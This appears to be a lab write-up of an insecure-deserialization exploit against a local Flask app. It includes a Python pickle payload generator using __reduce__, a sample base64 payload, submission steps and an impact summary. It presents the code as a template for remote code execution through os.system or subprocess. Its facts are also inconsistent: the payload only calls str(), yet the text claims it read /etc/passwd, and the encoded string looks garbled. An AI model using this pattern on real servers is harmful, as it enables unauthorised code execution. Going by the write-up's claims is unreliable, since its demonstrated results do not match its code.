# Payloads

## Vulnerability
`CWE-502: Deserialization of Untrusted Data`. The server deserializes
user-controlled, base64-encoded bytes with `pickle.loads()` without any
validation, signing, or sandboxing.

## Payload generator — `exploit.py`

```python
import pickle
import base64

class Exploit:
    def __reduce__(self):
        return (str, ("cat /etc/passwd",))

payload = pickle.dumps(Exploit())
encoded = base64.urlsafe_b64encode(payload)
print(encoded.decode())
```

`__reduce__` is the hook `pickle` uses to know how to reconstruct an object.
By returning `(callable, args_tuple)`, we tell pickle: "to rebuild this
object, call `callable(*args_tuple)`." Here it is `str("cat /etc/passwd")`,
which stands in for the fact that **any** importable callable (e.g.
`os.system`, `subprocess.Popen`) and **any** arguments can be substituted —
this is the core of why unpickling untrusted data is equivalent to letting
an attacker run arbitrary code.

### Generated payload (example run)

```
gASVKgAAAAAAACMCGJ1aWx0aW5zlIwDc3RylJOUjA9jYXQgL2V0Yy9wYXNzd2SUhZRSlC4=
```

(Base64 is not encryption or a signature — it is only an encoding, so this
string can be freely read, modified, or regenerated by anyone.)

## Submission steps
1. Start the vulnerable Flask app (`http://127.0.0.1:5000/`).
2. Run `python3 exploit.py` and copy the printed base64 string.
3. Paste it into the "Enter Serialized Data" textarea.
4. Click **Submit**.

## Impact
- Full remote code execution on the host running the Flask app.
- Attacker-controlled commands run with the privileges of the server
  process (here, enough to read `/etc/passwd`; in a real deployment this
  could extend to reading secrets, pivoting to other systems, installing
  persistence, etc.).
- No authentication was required to reach the vulnerable endpoint.
